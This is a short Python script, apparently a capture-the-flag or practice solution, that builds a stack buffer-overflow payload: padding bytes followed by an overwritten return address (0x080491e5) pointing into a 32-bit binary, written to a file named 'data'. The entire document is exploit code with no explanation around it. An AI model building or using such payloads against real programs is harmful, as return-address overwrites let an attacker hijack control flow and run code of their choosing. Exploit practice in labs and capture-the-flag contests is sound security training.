
payload = b'A'*0x12+b'B'*0x4+b'\xe5\x91\x04\x08'

with open("data","wb") as f:
    f.write(payload)